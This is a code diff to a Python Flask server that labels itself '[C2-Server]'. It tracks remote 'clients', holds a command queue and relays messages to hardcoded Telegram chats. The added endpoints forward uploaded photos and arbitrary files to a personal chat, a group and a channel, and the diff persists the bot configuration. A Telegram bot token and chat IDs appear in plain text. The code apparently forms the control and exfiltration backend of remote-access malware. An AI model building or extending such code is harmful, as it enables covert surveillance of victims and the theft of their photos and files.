@@ -14,6 +14,8 @@ import logging
 import sqlite3
 import csv
 import io
+import socket
+import platform
 from datetime import datetime
 from functools import wraps
 from collections import defaultdict
@@ -204,11 +206,34 @@ clients = {}
 commands = []
 
 # ======================== إعدادات Telegram ========================
-TOKEN = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
-CHAT_ID_PERSONAL = "7604675763"
-CHAT_ID_GROUP = "-1002470378114"
-CHAT_ID_CHANNEL = "-1002426552780"
-ALL_CHATS = [CHAT_ID_PERSONAL, CHAT_ID_GROUP, CHAT_ID_CHANNEL]
+TELEGRAM_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'telegram_config.json')
+
+_DEFAULT_TOKEN    = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
+_DEFAULT_CHATS    = ["7604675763", "-1002470378114", "-1002426552780"]
+
+TOKEN     = _DEFAULT_TOKEN
+ALL_CHATS = list(_DEFAULT_CHATS)
+
+def _load_telegram_config():
+    global TOKEN, ALL_CHATS
+    if os.path.exists(TELEGRAM_CONFIG_PATH):
+        try:
+            with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+            TOKEN     = cfg.get('token', _DEFAULT_TOKEN) or _DEFAULT_TOKEN
+            ALL_CHATS = cfg.get('chat_ids', _DEFAULT_CHATS) or []
+            logger.info(f"✅ Telegram config loaded — chats: {ALL_CHATS}")
+        except Exception as e:
+            logger.error(f"Failed to load telegram config: {e}")
+
+def _save_telegram_config():
+    try:
+        with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
+            json.dump({'token': TOKEN, 'chat_ids': ALL_CHATS}, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        logger.error(f"Failed to save telegram config: {e}")
+
+_load_telegram_config()
 
 # ======================== دوال مساعدة ========================
 def check_bot_status():
@@ -375,12 +400,43 @@ def get_data():
     return jsonify(clients_data)
 
 # ======================== 8. عرض الأجهزة ========================
+def _get_server_info():
+    """Return static info about the machine running this server."""
+    try:
+        hostname = socket.gethostname()
+    except Exception:
+        hostname = "unknown"
+    try:
+        ip = socket.gethostbyname(hostname)
+    except Exception:
+        ip = "127.0.0.1"
+    os_info = f"{platform.system()} {platform.release()}".strip()
+    return hostname, ip, os_info
+
 @app.route("/clients", methods=["GET"])
 @rate_limit
 def get_clients():
     readable = {}
+
+    # Permanent server entry — always online, always first
+    hostname, ip, os_info = _get_server_info()
+    now = time.time()
+    readable["[C2-Server]"] = {
+        "last_seen": time.ctime(now),
+        "timestamp": now,
+        "is_server": True,
+        "hostname": hostname,
+        "ip": ip,
+        "os": os_info,
+    }
+
     for cid, info in clients.items():
-        readable[cid] = {"last_seen": time.ctime(info["last_seen"]), "timestamp": info["last_seen"]}
+        readable[cid] = {
+            "last_seen": time.ctime(info["last_seen"]),
+            "timestamp": info["last_seen"],
+            "is_server": False,
+        }
+
     return jsonify(readable)
 
 # ======================== 9. إرسال لتليجرام ========================
@@ -396,6 +452,54 @@ def send_to_telegram():
     for chat_id in ALL_CHATS:
         try:
             requests.post(url, data={"chat_id": chat_id, "text": message})
+            results.append({"chat_id": chat_id, "status": "sent"})
+        except Exception as e:
+            results.append({"chat_id": chat_id, "error": str(e)})
+
+    return jsonify({"results": results})
+
+# ======================== 9b. إرسال صورة لتليجرام ========================
+@app.route("/send_photo_to_telegram", methods=["POST"])
+@rate_limit
+@require_auth
+def send_photo_to_telegram():
+    if 'photo' not in request.files:
+        return jsonify({"error": "No photo provided"}), 400
+
+    photo = request.files['photo']
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+
+    results = []
+    for chat_id in ALL_CHATS:
+        try:
+            photo.seek(0)
+            requests.post(url, data={"chat_id": chat_id}, files={"photo": photo.read()})
+            results.append({"chat_id": chat_id, "status": "sent"})
+        except Exception as e:
+            results.append({"chat_id": chat_id, "error": str(e)})
+
+    return jsonify({"results": results})
+
+# ======================== 9c. إرسال ملف لتليجرام ========================
+@app.route("/send_file_to_telegram", methods=["POST"])
+@rate_limit
+@require_auth
+def send_file_to_telegram():
+    if 'file' not in request.files:
+        return jsonify({"error": "No file provided"}), 400
+
+    file = request.files['file']
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+    results = []
+    for chat_id in ALL_CHATS:
+        try:
+            file.seek(0)
+            requests.post(
+                url,
+                data={"chat_id": chat_id},
+                files={"document": (file.filename, file.read(), file.content_type or "application/octet-stream")}
+            )
             results.append({"chat_id": chat_id, "status": "sent"})
         except Exception as e:
             results.append({"chat_id": chat_id, "error": str(e)})
@@ -431,7 +535,24 @@ def get_stats():
         "bot_status": check_bot_status()
     })
 
-# ======================== 12. تحديث إعدادات تليجرام ========================
+# ======================== 12. إدارة إعدادات تليجرام ========================
+@app.route("/telegram_config", methods=["GET"])
+@rate_limit
+def get_telegram_config():
+    has_token = bool(TOKEN and TOKEN.strip())
+    masked = ""
+    if has_token:
+        t = TOKEN.strip()
+        if len(t) > 12:
+            masked = t[:8] + "••••" + t[-4:]
+        else:
+            masked = "••••"
+    return jsonify({
+        "has_token": has_token,
+        "masked_token": masked,
+        "chat_ids": ALL_CHATS,
+    })
+
 @app.route("/update_telegram_settings", methods=["POST"])
 @rate_limit
 @require_auth
@@ -442,7 +563,19 @@ def update_telegram_settings():
         TOKEN = data["token"]
     if "chat_ids" in data:
         ALL_CHATS = data["chat_ids"]
+    _save_telegram_config()
     return jsonify({"status": "updated"})
+
+@app.route("/telegram_config", methods=["DELETE"])
+@rate_limit
+@require_auth
+def delete_telegram_config():
+    global TOKEN, ALL_CHATS
+    TOKEN     = ""
+    ALL_CHATS = []
+    _save_telegram_config()
+    logger.info("🗑️ Telegram config cleared")
+    return jsonify({"status": "deleted"})
 
 # ======================== 13. اختبار ========================
 @app.route("/test_data", methods=["POST"])
